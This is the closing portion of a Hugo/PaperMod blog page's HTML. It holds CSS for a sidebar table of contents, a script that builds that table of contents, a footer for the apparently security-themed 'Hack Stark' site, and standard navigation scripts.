    text-align: center;
  }

   
  #toc-list {
    list-style: none;
    padding: 0;
    margin: 0;
  }

  #toc-list li {
    margin: 5px 0;
  }

  #toc-list li.h2 {
    margin-left: 10px;
    font-size: 13px;
  }

  #toc-list li.h3 {
    margin-left: 20px;
    font-size: 12px;
  }

  #toc-list a {
    color: #9ad0ff;
    text-decoration: none;
    transition: color 0.2s ease;
  }

  #toc-list a:hover {
    color: #00bfff;
  }

   

   
  @media (max-width: 1700px) {
    #sidebar-toc {
      right: 15%;
      width: 220px;
      font-size: 13px;
    }
  }

   
  @media (max-width: 1440px) {

    .post-container {
      justify-content: center;
    }

    #sidebar-toc {
      position: fixed;
      top: auto;
      bottom: 20px;
      right: 10%;
      width: auto;
      padding: 10px 14px;
      background-color: rgba(0, 0, 0, 0.8);
      border-radius: 8px;
      font-size: 13px;
      max-height: none;
      overflow: visible;
      cursor: pointer;
    }

    #sidebar-toc::after {
      content: "☰ Contenido";
      color: #00bfff;
      font-weight: bold;
    }

     
    #toc-list,
    .sidebar-title {
      display: none;
    }

     
    #sidebar-toc:hover #toc-list {
      display: block;
      position: absolute;
      right: 0;
      bottom: 40px;
      width: 220px;
      background-color: rgba(25, 25, 25, 0.95);
      border-radius: 8px;
      padding: 10px;
    }

    #sidebar-toc:hover .sidebar-title {
      display: block;
      text-align: center;
      margin-bottom: 5px;
    }
  }
</style>


<script>
  document.addEventListener("DOMContentLoaded", function () {
    const content = document.querySelector(".post-content");
    const tocList = document.getElementById("toc-list");
    if (!content || !tocList) return;

    const headings = content.querySelectorAll("h1, h2, h3");
    headings.forEach((heading, index) => {
      const id = heading.id || `section-${index}`;
      heading.id = id;

      const li = document.createElement("li");
      li.classList.add(heading.tagName.toLowerCase());

      const a = document.createElement("a");
      a.href = `#${id}`;
      a.textContent = heading.textContent;

      li.appendChild(a);
      tocList.appendChild(li);
    });
  });
</script>
    </main>
    
<footer class="footer">
        <span>&copy; 2026 <a href="https://hackstark.netlify.app/">Hack Stark ×͜×</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu');
    if (menu) {
        
        const scrollPosition = localStorage.getItem("menu-scroll-position");
        if (scrollPosition) {
            menu.scrollLeft = parseInt(scrollPosition, 10);
        }
        
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
</body>

</html>
